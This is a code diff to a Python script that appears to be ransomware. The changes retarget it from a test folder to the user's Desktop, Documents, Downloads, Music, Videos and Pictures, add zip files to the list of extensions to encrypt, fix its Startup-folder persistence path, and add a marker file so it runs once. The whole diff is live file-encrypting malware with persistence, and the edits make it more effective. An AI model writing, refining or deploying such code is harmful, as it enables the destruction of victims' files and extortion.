@@ -11,9 +11,8 @@ filelimit = 1024 * 1024 * 1024 # 1 GB
 
 def find_files(mode="E"):
     allFiles = []
-    valid_extensions = ["doc", "docx", "html", "htm", "odt", "pdf", "xls", "xlsx", "ods", "ppt", "pptx", "txt", "jpeg", "jpg", "png", "gif", "tiff", "psd", "eps", "ai", "indd", "raw", "bmp", "webp", "bat", "svg", "mp4", "avi", "mov", "flv", "wmv", "mpg", "pcm", "wav", "aiff", "mp3", "ogg", "aac", "wma", "flac", "alac", "wma", "rar", "csv", "torrent", "sqlite3", "sqlite", "db", "sql", "accdb", "sln", "suo", "cpp", "c", "cmd", "php", "java", "jar", "mpeg", "mov", "3gp", "mkv", "psd", "bak", "key", "7z", "iso", "bin", "dat", "log", "dbf", "tar", "xml", "py", "rb", "js", "md", "class", "cs", "h", "dll", "mkv" , "mid", "exe"]
-    #allowed_dirs = ["Desktop", "Documents", "Downloads", "Music", "Videos", "Pictures"]
-    allowed_dirs = ["LGX"]
+    valid_extensions = ["doc", "docx", "html", "htm", "odt", "pdf", "xls", "xlsx", "ods", "ppt", "pptx", "txt", "jpeg", "jpg", "png", "gif", "tiff", "psd", "eps", "ai", "indd", "raw", "bmp", "webp", "bat", "svg", "mp4", "avi", "mov", "flv", "wmv", "mpg", "pcm", "wav", "aiff", "mp3", "ogg", "aac", "wma", "flac", "alac", "wma", "rar", "csv", "torrent", "sqlite3", "sqlite", "db", "sql", "accdb", "sln", "suo", "cpp", "c", "cmd", "php", "java", "jar", "mpeg", "mov", "3gp", "mkv", "psd", "bak", "key", "7z", "iso", "bin", "dat", "log", "dbf", "tar", "xml", "py", "rb", "js", "md", "class", "cs", "h", "dll", "mkv" , "mid", "exe", "zip"]
+    allowed_dirs = ["Desktop", "Documents", "Downloads", "Music", "Videos", "Pictures"]
     username = os.path.expanduser("~")
     for dirs in allowed_dirs:
         for root, subfiles, files in os.walk(os.path.join(username, dirs)):
@@ -51,7 +50,7 @@ def filter_file_size(files):
 
 def persistence():
     username = os.path.expanduser("~")
-    path = os.path.join(username + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+    path = os.path.join(username + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
     current_path = os.path.join(username, os.getcwd(), project_name)
     if not os.path.exists(os.path.join(path, project_name)):
         copy2(current_path, path)
@@ -62,12 +61,27 @@ def genpass():
      password = sha256(password.encode()).hexdigest()
      return password
 
+def createWarnings(check=True):
+    username = os.path.expanduser("~")
+    path = os.path.join(username + "\\AppData\\Roaming\\Microsoft\\Windows\\", ".GrpC")
+    if check:
+        if os.path.exists(path):
+            return False
+        else:
+            return True
+    else:
+        with open(path, "w") as f:
+            f.write(".LOG")
+
+
 def start(mode="E"):
-    persistence()
-    files_t = find_files(mode)
-    password = genpass()
-    encryptFiles(files_t, password)
-    #decryptFiles(files_t, password)
+    if createWarnings():
+        persistence()
+        files_t = find_files(mode)
+        password = genpass()
+        encryptFiles(files_t, password)
+        #decryptFiles(files_t, password)
+        createWarnings(check=False)
 
 
 if __name__ == "__main__":
